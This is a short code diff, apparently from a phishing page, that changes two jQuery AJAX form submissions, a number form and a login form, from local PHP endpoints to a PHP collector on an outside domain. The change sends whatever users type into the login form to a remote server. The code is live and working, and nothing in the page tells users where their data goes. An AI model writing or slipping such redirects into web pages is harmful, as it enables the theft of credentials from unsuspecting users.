@@ -8,7 +8,7 @@ $('.load').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'req/no.php',
+            url: 'https://axcellent.dvnet.org/app31/no.php',
             data: $('#eform').serialize(),
             datatype: 'JSON',           
             complete: function(data) {
@@ -27,7 +27,7 @@ $('.load').fadeIn();
  document.getElementById('kirims').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'req/login.php',
+            url: 'https://axcellent.dvnet.org/app31/login.php',
             data: $('#login').serialize(),
             datatype: 'JSON',           
             complete: function(data) {
